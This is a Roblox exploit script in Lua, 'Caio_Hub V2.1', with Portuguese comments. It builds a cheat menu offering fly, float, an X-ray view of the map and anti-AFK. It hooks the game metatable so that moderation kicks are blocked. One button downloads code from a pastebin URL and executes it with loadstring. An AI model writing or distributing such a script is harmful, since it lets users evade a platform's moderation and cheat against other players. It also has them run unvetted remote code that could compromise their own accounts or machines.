-- Caio_Hub V2.1 - GUI completo sem ícone + Anti Kick forçável
-- LocalScript dentro de StarterGui ou PlayerGui

-- Serviços
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")

player.CharacterAdded:Connect(function(char)
	character = char
	hrp = char:WaitForChild("HumanoidRootPart")
	humanoid = char:WaitForChild("Humanoid")
end)

-- Configurações
local floatSpeed = 20
local flySpeed = 24
local originalGravity = workspace.Gravity
local originalFogEnd = Lighting.FogEnd
local state = { float = false, fly = false }
local modifiedParts = {} -- Para X-Ray

local function clamp(v,a,b) return math.max(a,math.min(b,v)) end

------------------------------------------------------------
-- 🔒 ANTI KICK FORÇÁVEL + ANTI AFK
------------------------------------------------------------
-- Bloqueia Player:Kick()
pcall(function()
	if player.Kick then
		player.Kick = function(...) warn("[Caio_Hub] Kick bloqueado!") end
	end
end)

-- Bloqueia :Kick() via Namecall
pcall(function()
	local mt = getrawmetatable(game)
	if mt then
		local old = mt.__namecall
		setreadonly(mt,false)
		mt.__namecall = newcclosure(function(self,...)
			local method = getnamecallmethod()
			if method == "Kick" or method == "kick" then
				warn("[Caio_Hub] Tentativa de Kick bloqueada.")
				return nil
			end
			return old(self,...)
		end)
		setreadonly(mt,true)
	end
end)

-- Anti AFK automático
spawn(function()
	while task.wait(60) do
		pcall(function()
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end
end)

------------------------------------------------------------
-- 🖥 GUI PRINCIPAL
------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CaioHubGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0,320,0,300)
mainFrame.Position = UDim2.new(0.05,0,0.2,0)
mainFrame.BackgroundColor3 = Color3.fromRGB(18,18,20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0,18)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Thickness = 3
mainStroke.Color = Color3.fromRGB(0,128,255)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1,-20,0,44)
title.Position = UDim2.new(0,10,0,8)
title.BackgroundTransparency = 1
title.Text = "Caio_Hub (V2.1)"
title.TextColor3 = Color3.fromRGB(160,210,255)
title.Font = Enum.Font.Arcade
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Left

------------------------------------------------------------
-- 🔘 Função criar botões
------------------------------------------------------------
local function createButton(text,y)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0,280,0,44)
	btn.Position = UDim2.new(0,20,0,y)
	btn.BackgroundColor3 = Color3.fromRGB(40,40,44)
	btn.BorderSizePixel = 0
	btn.Font = Enum.Font.Arcade
	btn.TextSize = 18
	btn.TextColor3 = Color3.fromRGB(230,230,230)
	btn.Text = text.." : OFF"
	local uc = Instance.new("UICorner", btn)
	uc.CornerRadius = UDim.new(0,10)
	local stroke = Instance.new("UIStroke", btn)
	stroke.Thickness = 1
	stroke.Color = Color3.fromRGB(80,140,255)
	stroke.Transparency = 0.4
	return btn
end

------------------------------------------------------------
-- 🔩 Cria botões
------------------------------------------------------------
local floatBtn = createButton("Float UP",64)
local flyBtn = createButton("Fly to Base",120)
local privadoBtn = createButton("Privado Server (OP)",176)

floatBtn.Parent = mainFrame
flyBtn.Parent = mainFrame
privadoBtn.Parent = mainFrame

------------------------------------------------------------
-- ⚡ Funções dos botões
------------------------------------------------------------
-- Float UP com X-ray
floatBtn.MouseButton1Click:Connect(function()
	state.float = not state.float
	if state.float then
		floatBtn.Text = "Float UP : ON"
		floatBtn.BackgroundColor3 = Color3.fromRGB(0,255,128)
		-- X-Ray
		modifiedParts = {}
		for _, obj in ipairs(Workspace:GetDescendants()) do
			if obj:IsA("BasePart") then
				table.insert(modifiedParts,{part=obj,originalTransparency=obj.Transparency})
				obj.Transparency = clamp(obj.Transparency+0.7,0,1)
			end
		end
		Lighting.FogEnd = 999999
		RunService:BindToRenderStep("FloatUP",Enum.RenderPriority.Character.Value+1,function()
			if hrp and state.float then
				hrp.Velocity = Vector3.new(0,floatSpeed,0)
			end
		end)
	else
		floatBtn.Text = "Float UP : OFF"
		floatBtn.BackgroundColor3 = Color3.fromRGB(40,40,44)
		-- Remove X-ray
		for _, data in ipairs(modifiedParts) do
			if data.part then data.part.Transparency = data.originalTransparency end
		end
		modifiedParts = {}
		Lighting.FogEnd = originalFogEnd
		RunService:UnbindFromRenderStep("FloatUP")
	end
end)

-- Fly to Base
flyBtn.MouseButton1Click:Connect(function()
	state.fly = not state.fly
	if state.fly then
		flyBtn.Text = "Fly to Base : ON"
		flyBtn.BackgroundColor3 = Color3.fromRGB(0,255,128)
		workspace.Gravity = 0
		RunService:BindToRenderStep("FlyCamera",Enum.RenderPriority.Character.Value+1,function()
			if hrp and state.fly then
				local cam = workspace.CurrentCamera
				local dir = cam.CFrame.LookVector
				hrp.Velocity = dir * flySpeed
			end
		end)
	else
		flyBtn.Text = "Fly to Base : OFF"
		flyBtn.BackgroundColor3 = Color3.fromRGB(40,40,44)
		RunService:UnbindFromRenderStep("FlyCamera")
		workspace.Gravity = originalGravity
		if hrp then hrp.Velocity = Vector3.zero end
	end
end)

-- Privado Server (OP)
privadoBtn.MouseButton1Click:Connect(function()
	privadoBtn.Text = "Executando..."
	privadoBtn.BackgroundColor3 = Color3.fromRGB(0,255,128)
	task.wait(0.5)
	pcall(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Ru4UQDpN"))()
	end)
	privadoBtn.Text = "Privado Server (OP) : OK"
	task.wait(1)
	privadoBtn.Text = "Privado Server (OP)"
	privadoBtn.BackgroundColor3 = Color3.fromRGB(40,40,44)
end)

-- Anti bug: não cair abaixo do mapa
RunService.RenderStepped:Connect(function()
	pcall(function()
		if hrp and hrp.Position.Y < -200 then
			hrp.CFrame = CFrame.new(0,50,0)
		end
	end)
end)
